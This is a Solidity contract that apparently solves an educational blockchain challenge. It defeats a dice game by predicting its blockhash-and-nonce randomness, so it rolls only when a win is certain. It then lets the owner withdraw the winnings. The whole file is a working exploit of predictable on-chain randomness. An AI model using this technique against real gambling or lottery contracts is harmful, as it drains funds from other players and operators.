pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	DiceGame public diceGame;
	uint256 nonce = 0;

	error NotEnoughEther();
	error RollBiggerThanFive();

	constructor(address payable diceGameAddress) payable {
		diceGame = DiceGame(diceGameAddress);
	}

	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
	function withdraw(address _addr, uint256 _amount) external onlyOwner {
		uint256 amount = address(this).balance;

		if (_amount > amount) {
			revert NotEnoughEther();
		}

		(bool sent, ) = _addr.call{ value: _amount }("");
		require(sent, "Failed to send Ether");
	}

	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
	function riggedRoll() external payable {
		if (address(this).balance < .002 ether) {
			revert NotEnoughEther();
		}

		// Predict the outcome of the roll

		bytes32 prevHash = blockhash(block.number - 1);
		console.log("block.number Rigged", block.number);

		uint256 _nonce = diceGame.nonce();
		console.log("dice game nonce : ", _nonce);

		bytes32 hash = keccak256(
			abi.encodePacked(prevHash, address(diceGame), _nonce)
		);
		uint256 rRoll = uint256(hash) % 16;

		console.log("\t", "  Rigged Roll:", rRoll);

		// Call rollTheDice only if it's a winning outcome

		if (rRoll > 5) {
			revert RollBiggerThanFive();
		}

		diceGame.rollTheDice{ value: 0.002 ether }();
	}

	// Include the `receive()` function to enable the contract to receive incoming Ether.
	receive() external payable {}
}
